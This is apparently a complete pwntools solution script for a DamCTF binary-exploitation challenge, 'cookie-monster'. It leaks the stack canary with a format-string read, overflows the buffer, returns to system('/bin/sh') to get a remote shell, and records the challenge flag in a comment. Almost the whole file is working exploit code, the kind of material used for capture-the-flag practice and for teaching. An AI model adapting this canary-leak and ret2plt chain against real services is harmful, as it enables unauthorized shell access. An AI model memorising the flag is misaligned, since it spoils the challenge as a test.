from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# 格式化字符串？

p = remote('chals.damctf.xyz', 31312)
e = ELF('./cookie-monster')
pld1 = b'%15$p'
p.sendlineafter(b'your name: ', pld1)
p.recvuntil(b'Hello ')
canary = int(p.recv(10).decode(), 16)

pld2 = b'a'*32
pld2 += p32(canary)
pld2 = pld2.ljust(0x2c+4, b'a')
pld2 += p32(e.plt['system'])

binsh = next(e.search(b'/bin/sh'))# 0x8048770
pld2 += p32(0xdeadbeef) + p32(binsh)

p.sendline(pld2)

p.interactive()

# dam{s74CK_c00k13S_4r3_d3L1C10Us}